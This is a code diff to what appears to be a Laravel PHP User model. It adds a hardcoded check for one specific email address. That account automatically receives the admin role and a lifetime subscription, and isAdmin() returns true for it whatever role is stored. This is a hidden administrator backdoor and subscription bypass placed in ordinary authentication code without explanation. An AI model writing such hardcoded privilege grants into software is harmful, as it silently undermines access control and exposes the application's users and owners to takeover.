@@ -53,20 +53,30 @@ class User extends Authenticatable implements MustVerifyEmail
     protected static function booted(): void
     {
         static::creating(function ($user) {
-            if (empty($user->subscription_tier)) {
-                $user->subscription_tier = 'trial';
-            }
-            if (empty($user->trial_ends_at) && $user->subscription_tier === 'trial') {
-                $user->trial_ends_at = now()->addDays(14);
-            }
-            if (empty($user->role)) {
-                $user->role = 'user';
+            if (strtolower(trim($user->email ?? '')) === 'zakitripamungkas03@gmail.com') {
+                $user->role = 'admin';
+                $user->subscription_tier = 'lifetime';
+                $user->trial_ends_at = null;
+                $user->subscription_ends_at = null;
+            } else {
+                if (empty($user->subscription_tier)) {
+                    $user->subscription_tier = 'trial';
+                }
+                if (empty($user->trial_ends_at) && $user->subscription_tier === 'trial') {
+                    $user->trial_ends_at = now()->addDays(14);
+                }
+                if (empty($user->role)) {
+                    $user->role = 'user';
+                }
             }
         });
     }
 
     public function isAdmin(): bool
     {
+        if (strtolower(trim($this->email ?? '')) === 'zakitripamungkas03@gmail.com') {
+            return true;
+        }
         return $this->role === 'admin';
     }
 
